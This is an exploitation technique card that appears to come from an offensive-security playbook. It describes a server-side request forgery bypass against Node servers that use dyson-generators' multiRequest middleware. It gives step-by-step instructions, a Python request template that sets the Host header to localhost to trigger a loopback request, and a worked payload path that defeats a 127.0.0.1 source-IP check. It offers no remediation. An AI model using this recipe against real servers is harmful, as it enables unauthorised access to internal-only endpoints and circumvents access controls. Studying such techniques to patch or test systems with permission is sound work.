---
name: dyson_multi_request_host_smuggling
vuln_type: ssrf
sub_technique: host_header_loopback_bypass
category: exploitation
safety_level: safe
tags:
- ssrf
- host-header
- multi-request
- ip-bypass
---

# Multirequest Host-Header Loopback Smuggling

## When to Apply

A Node server parses hostname/port from the client-supplied Host header when fanning out internal requests. The multiRequest feature (splits on ',' in path fragment then fires http.get for each) uses `req.headers.host.split(':')` to determine the target. Sending Host: localhost:port makes the server issue a loopback request to itself → req.socket.remoteAddress=127.0.0.1.

## Prerequisites

- Server code checks `req.socket.remoteAddress` for IP (127.0.0.1 whitelist, etc.)
- dyson-generators or similar framework allowing Host header-based internal redirect
- Route goes through multiRequest middleware
- multiRequest delimiter (default ',') is known

## Steps

1. Identify IP check / internal-only endpoints in the server code.
2. Find routes on the same server that go through multiRequest middleware (dyson-generators enables this on all routes by default).
3. Insert a fragment containing ',' in the URL path — after split, each id is used in path.replace(arr, id) for loopback http.get.
4. **Set Host header to `localhost:<internal_port>`** — the server makes an internal request to itself. That request's remoteAddress = 127.0.0.1.
5. Ensure at least one sub-request URL matches the target route by arranging both sides of `,` as valid paths. Pass query strings by interleaving with `?` (e.g. `/api/X?guess=V&extra,X?guess=V`).


## Code Template

```
# url template: /<route>?<params>&<pad>,<route_tail>?<params>
# Host header must be 'localhost:<internal_port>'
import urllib.request
req = urllib.request.Request(
    'http://<target>/<route>?<params>&extra,<route_tail>?<params>',
    headers={'Host': 'localhost:<internal_port>'},
)
r = urllib.request.urlopen(req, timeout=10)

```

## Examples

### Example 1

- **route**: /api/protectedService
- **payload_path**: /api/protectedService?param=val&extra,protectedService?param=val
- **host_header**: localhost:3000
- **internal_port**: 3000
- **bypass_target**: req.socket.remoteAddress == 127.0.0.1 check

multiRequest: path fragment with ',' → range.split(',') → each id path.replace → http.get({hostname, port from Host header, path}). Host=localhost:3000 → backend loops back to itself, inner handler sees remoteAddress=127.0.0.1.
